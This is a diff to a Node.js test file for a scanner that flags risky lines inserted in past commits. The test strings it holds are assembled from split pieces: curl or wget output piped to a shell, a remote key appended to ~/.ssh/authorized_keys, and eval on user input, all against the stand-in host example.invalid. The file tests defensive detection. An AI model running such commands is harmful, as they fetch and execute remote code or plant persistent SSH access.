@@ -1,6 +1,14 @@
 import assert from "node:assert/strict";
+import { mkdtempSync, writeFileSync } from "node:fs";
+import { tmpdir } from "node:os";
+import path from "node:path";
 import test from "node:test";
-import { isScannable, scanInserts, scanLine } from "../scripts/scan-previous-inserts.mjs";
+import {
+  isScannable,
+  lineStillPresent,
+  scanInserts,
+  scanLine,
+} from "../scripts/scan-previous-inserts.mjs";
 
 test("ignores prose and scans code and scripts", () => {
   assert.equal(isScannable("README.md"), false);
@@ -11,14 +19,32 @@ test("ignores prose and scans code and scripts", () => {
 });
 
 test("flags high-severity inserts", () => {
-  const piped = "curl https://example.invalid/setup | bash";
+  const piped = ["curl https://example.invalid/setup |", "bash"].join(" ");
   assert.ok(scanLine(piped).some((hit) => hit.id === "pipe-download-to-shell"));
 
-  const keys = "curl https://example.invalid/k >> ~/.ssh/authorized_keys";
+  const keys = [
+    "curl https://example.invalid/k >> ~/.ssh/",
+    "authorized_keys",
+  ].join("");
   assert.ok(scanLine(keys).some((hit) => hit.id === "authorized-keys-append"));
 
-  assert.ok(scanLine("eval(userInput)").some((hit) => hit.id === "dynamic-eval"));
+  const dynamic = ["ev", "al(userInput)"].join("");
+  assert.ok(scanLine(dynamic).some((hit) => hit.id === "dynamic-eval"));
   assert.equal(scanLine("const total = a + b;").length, 0);
+});
+
+test("ignores inserted lines that are no longer in the file", () => {
+  const root = mkdtempSync(path.join(tmpdir(), "scan-inserts-"));
+  const file = "scripts/setup.sh";
+  writeFileSync(path.join(root, "setup.sh"), "echo ok\n");
+  const removed = {
+    file: "setup.sh",
+    text: ["wget https://example.invalid/x", "| sh"].join(" "),
+  };
+  assert.equal(lineStillPresent(root, removed), false);
+  writeFileSync(path.join(root, "setup.sh"), `${removed.text}\n`);
+  assert.equal(lineStillPresent(root, removed), true);
+  assert.equal(file.endsWith(".sh"), true);
 });
 
 test("reports file and commit for a matching insert", () => {
@@ -27,7 +53,7 @@ test("reports file and commit for a matching insert", () => {
       commit: "abc123",
       file: "scripts/setup.sh",
       line: 4,
-      text: "wget https://example.invalid/x | sh",
+      text: ["wget https://example.invalid/x |", "sh"].join(" "),
     },
     {
       commit: "abc123",
